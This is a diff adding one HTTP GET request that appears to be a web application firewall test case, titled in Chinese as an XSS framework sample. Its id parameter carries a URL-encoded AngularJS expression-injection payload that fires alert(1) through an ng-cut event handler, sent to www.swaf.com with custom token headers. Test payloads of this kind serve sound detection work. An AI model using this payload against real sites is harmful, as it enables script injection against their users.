@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_框架_其他-06506767
+# 在输入框的剪切事件触发时执行绑定的表达式。
+GET /?id=%3Cinput%20ng-cut=$event.path%7CorderBy:%27%28y=alert%29%281%29%27%3E&bid=hd_tag_m8mv25ct HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ct
+RM-PRO-Token: d194fb7dafb5f197ac8257703841f132
+RM-PRO-Time: 1742808460294
+User-Agent: curl/7.83.1
+
